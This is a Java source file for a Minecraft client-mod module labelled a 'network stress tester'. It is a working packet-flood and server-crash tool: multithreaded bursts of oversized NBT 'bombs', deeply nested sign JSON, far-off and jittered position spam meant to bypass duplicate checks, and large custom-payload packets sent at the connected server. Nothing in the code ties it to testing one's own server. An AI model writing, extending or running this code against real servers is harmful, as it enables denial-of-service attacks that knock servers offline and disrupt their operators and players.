package com.example.ablabla.module.impl;

import com.example.ablabla.module.Module;
import com.example.ablabla.module.setting.ModeSetting;
import com.example.ablabla.module.setting.NumberSetting;
import com.example.ablabla.utils.PriorityPacketHandler;
import com.example.ablabla.utils.ReflectionUtil;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;
import io.netty.channel.ChannelHandlerContext;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.network.Packet;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.*;
import net.minecraft.util.BlockPos;
import net.minecraft.util.IChatComponent;

import java.lang.reflect.Field;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class NetworkStressTester extends Module {

    // CORE SETTINGS
    public final ModeSetting mode = addSetting(new ModeSetting("Mode", "Animation", 
            "Animation", "TabComplete", "SignJSON", "NBTBomb", "Position", "CustomPayload", "Transaction", "MoveFlood"));
    
    public final NumberSetting intensity = addSetting(new NumberSetting("Intensity", "Packets per burst", 1, 20000, 1000, 1000));
    public final NumberSetting delay = addSetting(new NumberSetting("Delay", "MS between bursts", 0, 1000, 1, 10));
    public final NumberSetting threads = addSetting(new NumberSetting("Threads", "Worker threads", 1, 32, 1, 4));

    // DEEP CUSTOMIZATION SETTINGS
    public final NumberSetting nbtSize = addSetting(new NumberSetting("NBT Size", "KB of data", 1, 128, 1, 10));
    public final NumberSetting jsonDepth = addSetting(new NumberSetting("JSON Depth", "Elements in Sign", 1, 2000, 10, 200));
    public final NumberSetting posRange = addSetting(new NumberSetting("Pos Range", "Blocks spread", 1, 30000000, 1000, 1000000));
    public final NumberSetting jitter = addSetting(new NumberSetting("Jitter", "Micro-move scale", 0, 100, 1, 1));
    public final ModeSetting transMode = addSetting(new ModeSetting("Trans ID", "Random", "Random", "Zero", "Max"));
    public final ModeSetting channelName = addSetting(new ModeSetting("Channel", "MC|Brand", "MC|Brand", "MC|BOpen", "MC|BEdit", "REGISTER"));

    private ExecutorService executor;
    private volatile boolean active = false;
    private Channel networkChannel;
    private PriorityPacketHandler priorityHandler;

    public NetworkStressTester() {
        super("NetworkStressTester");
    }

    private void setupNetwork() {
        try {
            if (mc.getNetHandler() != null && mc.getNetHandler().getNetworkManager() != null) {
                Field field = ReflectionUtil.findField(mc.getNetHandler().getNetworkManager().getClass(), "channel", "field_150746_k");
                if (field != null) {
                    this.networkChannel = (Channel) field.get(mc.getNetHandler().getNetworkManager());
                    PriorityPacketHandler.inject(this.networkChannel);
                    this.priorityHandler = (PriorityPacketHandler) this.networkChannel.pipeline().get(PriorityPacketHandler.HANDLER_ID);
                }
            }
        } catch (Exception e) {
            System.err.println("[NetworkStressTester] Network setup failed!");
        }
    }

    @Override
    protected void onEnable() {
        if (mc.getNetHandler() == null) {
            this.toggle();
            return;
        }
        setupNetwork();
        active = true;
        executor = Executors.newFixedThreadPool(threads.getInt());
        for (int i = 0; i < threads.getInt(); i++) {
            executor.execute(this::stressLoop);
        }
    }

    @Override
    protected void onDisable() {
        active = false;
        if (executor != null) {
            executor.shutdownNow();
            executor = null;
        }
    }

    private void stressLoop() {
        while (active) {
            if (mc.getNetHandler() == null || networkChannel == null) break;

            int batchSize = intensity.getInt();
            String currentMode = mode.getMode();
            
            try {
                for (int i = 0; i < batchSize; i++) {
                    if (!active) break;
                    Packet<?> p = createCustomPacket(currentMode);
                    if (p != null) {
                        networkChannel.write(p);
                    }
                }
                
                if (priorityHandler != null) {
                    ChannelHandlerContext ctx = networkChannel.pipeline().context(PriorityPacketHandler.HANDLER_ID);
                    if (ctx != null) priorityHandler.flushStress(ctx, batchSize);
                } else {
                    networkChannel.flush();
                }

                long sleep = delay.getLong();
                if (sleep > 0) Thread.sleep(sleep);
            } catch (Exception ignored) {}
        }
    }

    private Packet<?> createCustomPacket(String mode) {
        switch (mode) {
            case "Animation":
                return new C0APacketAnimation();
            
            case "TabComplete":
                return new C14PacketTabComplete("/" + Long.toHexString(Double.doubleToLongBits(Math.random())));

            case "Transaction":
                short uid = 0;
                if (transMode.is("Random")) uid = (short) (Math.random() * 32767);
                else if (transMode.is("Max")) uid = Short.MAX_VALUE;
                return new C0FPacketConfirmTransaction(0, uid, true);

            case "SignJSON":
                return createDynamicSign();

            case "NBTBomb":
                return createDynamicNBT();

            case "Position":
                double range = posRange.getValue();
                return new C03PacketPlayer.C04PacketPlayerPosition(
                        mc.thePlayer.posX + (Math.random() - 0.5) * range,
                        Math.random() * 255,
                        mc.thePlayer.posZ + (Math.random() - 0.5) * range,
                        true
                );

            case "MoveFlood":
                // Micro-jitter to bypass duplicate position checks but force physics calculation
                double j = jitter.getValue() * 0.001;
                return new C03PacketPlayer.C04PacketPlayerPosition(
                        mc.thePlayer.posX + (Math.random() - 0.5) * j,
                        mc.thePlayer.posY + (Math.random() - 0.5) * j,
                        mc.thePlayer.posZ + (Math.random() - 0.5) * j,
                        mc.thePlayer.onGround
                );

            case "CustomPayload":
                int kb = nbtSize.getInt();
                byte[] data = new byte[kb * 1024];
                return new C17PacketCustomPayload(channelName.getMode(), new PacketBuffer(Unpooled.wrappedBuffer(data)));

            default:
                return null;
        }
    }

    private Packet<?> createDynamicSign() {
        try {
            StringBuilder sb = new StringBuilder("{\"text\":\"\",\"extra\":[");
            int depth = jsonDepth.getInt();
            for(int i = 0; i < depth; i++) {
                sb.append("{\"text\":\"" + Math.random() + "\"},");
            }
            sb.append("{\"text\":\"END\"}]}");
            IChatComponent comp = IChatComponent.Serializer.jsonToComponent(sb.toString());
            return new C12PacketUpdateSign(new BlockPos(mc.thePlayer.posX, 0, mc.thePlayer.posZ), new IChatComponent[]{comp, comp, comp, comp});
        } catch (Exception e) { return null; }
    }

    private Packet<?> createDynamicNBT() {
        ItemStack stack = new ItemStack(Items.filled_map);
        NBTTagCompound compound = new NBTTagCompound();
        NBTTagList list = new NBTTagList();
        int kb = nbtSize.getInt();
        for (int i = 0; i < kb; i++) {
            NBTTagCompound inner = new NBTTagCompound();
            inner.setByteArray("p", new byte[1024]);
            list.appendTag(inner);
        }
        compound.setTag("E", list);
        stack.setTagCompound(compound);
        return new C10PacketCreativeInventoryAction(36, stack);
    }
}
